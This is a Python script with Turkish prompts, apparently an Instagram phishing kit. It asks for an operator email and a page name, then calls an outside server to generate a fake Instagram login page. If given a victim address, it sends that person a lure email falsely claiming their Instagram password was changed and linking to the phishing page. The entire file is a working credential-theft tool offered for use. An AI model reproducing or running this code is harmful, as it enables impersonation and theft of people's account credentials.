import requests
import json
import sys
import time
import os

def loading_animation():
    symbols = ["-", "|", "/", "\\"]
    for i in range(1, 16):
        sys.stdout.write('\r')
        sys.stdout.write('-' * i + symbols[i % len(symbols)])
        sys.stdout.flush()
        time.sleep(0.2)

print("""
 _______  ___      _______  _______  ___   _______    _______  __   __  ___   _______ 
|       ||   |    |       ||  _    ||   | |       |  |       ||  | |  ||   | |       |
|  _____||   |    |   _   || |_|   ||   | |_     _|  |    _  ||  |_|  ||   | |  _____|
| |_____ |   |    |  | |  ||       ||   |   |   |    |   |_| ||       ||   | | |_____ 
|_____  ||   |___ |  |_|  ||  _   | |   |   |   |    |    ___||       ||   | |_____  |
 _____| ||       ||       || |_|   ||   |   |   |    |   |    |   _   ||   |  _____| |
|_______||_______||_______||_______||___|   |___|    |___|    |__| |__||___| |_______|
""")

print("""
1--->Instagram
0--->Exit
""")
print("MORE is COMING SOON...")

seçim = input("Seçiminiz--->")

if seçim == "0":
    print("Exited")
else:
    if seçim == "1":
        # Kullanıcıdan mail al
        mail = input("Mail Adresiniz--->")

        # Kullanıcıdan to adresini al
        to = input("Mail göndermek istediğiniz adresi girin (boş bırakmak için enter'a basın)--->")

        # Eğer to boş değilse mail gönderme apisi kullan
           
        # Mail gönderme apisi kullanılmazsa devam et
        sayfaismi = input("Sayfa İsmi--->")
        print("\033[32m|")
        loading_animation()
        os.system("clear")

        api_url_sayfa = "https://socials.con.tc/api/yenisayfa.php"
        params_sayfa = {"sayfaismi": sayfaismi, "mail": mail}

        response_sayfa = requests.get(api_url_sayfa, params=params_sayfa)

        if response_sayfa.status_code == 200:
            print("""
            _______  ___      _______  _______  ___   _______    _______  __   __  ___   _______ 
            |       ||   |    |       ||  _    ||   | |       |  |       ||  | |  ||   | |       |
            |  _____||   |    |   _   || |_|   ||   | |_     _|  |    _  ||  |_|  ||   | |  _____|
            | |_____ |   |    |  | |  ||       ||   |   |   |    |   |_| ||       ||   | | |_____ 
            |_____  ||   |___ |  |_|  ||  _   | |   |   |   |    |    ___||       ||   | |_____  |
             _____| ||       ||       || |_|   ||   |   |   |    |   |    |   _   ||   |  _____| |
            |_______||_______||_______||_______||___|   |___|    |___|    |__| |__||___| |_______|
            """)
            
            phishsayfa = f"https://socials.con.tc/login/{sayfaismi}.php"
            
            if to:
                api_url_mail = "https://socials.con.tc/mail/mail.php"

                data_mail = {
                    'to': to,
                    'subject': "İnstagram Şifreniz Değişti!",
                    'body': f'Hesaınızı Kurtarmak İçin! {phishsayfa} Adresinden Giriş Yapın!'
                }

                headers_mail = {'Content-Type': 'application/json'}

                response_mail = requests.post(api_url_mail, data=json.dumps(data_mail), headers=headers_mail)
            
                print(f"\033[31m\nUrl:  {phishsayfa}")
        else:
            print(f"Hata! HTTP durumu: {response_sayfa.status_code}")
            print("API yanıtı:", response_sayfa.text)
    else:
        print("Geçersiz seçim. Lütfen 1'i seçin.")

    print("Programı sonlandırmak için 'e' tuşuna basın.")
    kapat_secimi = input("Seçiminiz--->")

    if kapat_secimi.lower() == "e":
        print("Program kapatılıyor...")
        sys.exit(0)
    else:
        print("Program devam ediyor.")